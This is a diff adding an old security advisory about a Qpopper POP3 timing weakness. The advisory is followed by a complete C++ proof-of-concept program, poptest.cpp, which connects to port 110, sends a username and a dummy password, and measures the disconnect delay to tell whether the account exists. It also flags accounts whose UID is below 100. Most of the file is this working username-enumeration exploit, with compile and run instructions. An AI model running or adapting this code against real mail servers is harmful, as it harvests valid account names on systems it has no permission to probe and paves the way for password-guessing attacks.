@@ -1,0 +1,157 @@
+source: http://www.securityfocus.com/bid/7110/info
+
+An information disclosure weakness has been reported for Qpopper when authenticating. The weakness is due to the fact that if a valid username is sent with a bad password, Qpopper will wait a small amount of time prior to disconnecting the client. If the username that is sent is invalid, Qpopper immediately disconnects the client.
+
+A determined attacker can exploit this weakness to gather a list of valid usernames on a vulnerable system using Qpopper.
+
+/**
+ * $Author: plasmahh $
+ * $Date: 2003/03/11 15:01:45 $
+ *
+ * This is a proof of concept code to check wheter a given username is valid on
+ * a system running qpopper 4.0.4 and possibly other versions.
+ *
+ * Compile :
+ *
+ * g++ -Wall poptest.cpp -o poptest
+ * or 
+ * g++ -D_DEBUG_ poptest.cpp -o poptest
+ * (to see whats going on) 
+ *
+ * Run :
+ *
+ * ./poptest <hostname> <username>
+ *
+ * e.g.
+ *
+ * ./poptest 127.0.0.1 root
+ *
+ * When a username is valid on the system, qpopper waits ~10 seconds before it
+ * sends the sing off message to the user. If the username is not valid, it
+ * will send it immediately after the password is entered.
+ * If the username has a uid < 100 qpopper is even so nice to tell us.
+ */
+
+#include <iostream>
+extern "C" {
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <string.h>
+}
+
+using namespace std;
+
+//#define _DEBUG_ 1
+
+int main ( int argc, char * argv[])
+{
+  struct timeval tim1;
+  struct timeval tim2;
+  int sock;
+  struct hostent *peerip;
+  struct sockaddr_in peer;
+  char * buf = new char[4096];
+
+
+  if ( argc != 3 )
+  {
+      cerr << "Must give username and host" << endl;
+      return -1;
+  }
+
+  
+  sock = socket ( AF_INET, SOCK_STREAM, 0);
+
+  peerip = gethostbyname ( argv[1] );
+
+  if ( ! peerip ) 
+  {
+      cerr << "Hostname not valid" << endl;
+      return -1;
+  }
+  cout << "Validating username " << argv[2] << " , please stand by.."  << endl;
+
+  peer.sin_family = AF_INET;
+  peer.sin_port = htons(110);
+  peer.sin_addr = *((struct in_addr *) peerip->h_addr);
+  memset(&(peer.sin_zero),0,8);
+
+
+
+  if ( connect( sock, (sockaddr *) & peer, sizeof(struct sockaddr)) < 0)
+  {
+      cerr << "Could not connect !" << endl;
+      return -1;
+  } 
+
+  memset ( buf, 0, 4096 );
+  read ( sock, buf, 4096 );
+#ifdef _DEBUG_
+  cout << "<- " << buf << endl;
+#endif
+
+
+
+  memset ( buf, 0, 4096 );
+  snprintf ( buf, 4096, "USER %s\r\n", argv[2]);
+  write ( sock, buf, strlen(buf) );
+#ifdef _DEBUG_
+  cout << "-> " << buf << endl;
+#endif
+
+  memset ( buf, 0, 4096 );
+  read ( sock, buf, 4096 );
+#ifdef _DEBUG_
+  cout << "<- " << buf << endl;
+#endif
+
+  write ( sock, "PASS xxx\r\n", 11);
+#ifdef _DEBUG_
+  cout << "-> PASS xxx" << endl;
+#endif
+
+  memset ( buf, 0, 4096 );
+  read ( sock, buf, 4096 );
+#ifdef _DEBUG_
+  cout << "<- " << buf << endl;
+#endif
+
+  if ( strstr( buf, "100") != NULL )
+  {
+      cout << "User has probably an UID < 100 and is a valid user." << endl;
+      close(sock);
+      return 0;
+  }
+
+  gettimeofday(&tim1,NULL);
+  memset ( buf, 0, 4096 );
+  read ( sock, buf, 4096 );
+#ifdef _DEBUG_
+  cout << "<- " << buf << endl;
+#endif
+  gettimeofday(&tim2,NULL);
+
+  double s = (tim2.tv_sec - tim1.tv_sec);
+  s += ((double)(tim2.tv_usec - tim1.tv_usec))/1000000.0;
+
+  cout << "Disconnected after " << s << " seconds." << endl;
+
+  if ( s > 1.0 )
+  {
+      cout << "User \"" << argv[2] << "\" is probably a valid user" << endl;
+  }
+  else
+  {
+      cout << "User \"" << argv[2] << "\" is probably NOT a valid user" << endl;
+  }
+  close(sock);
+  return 0;
+
+}
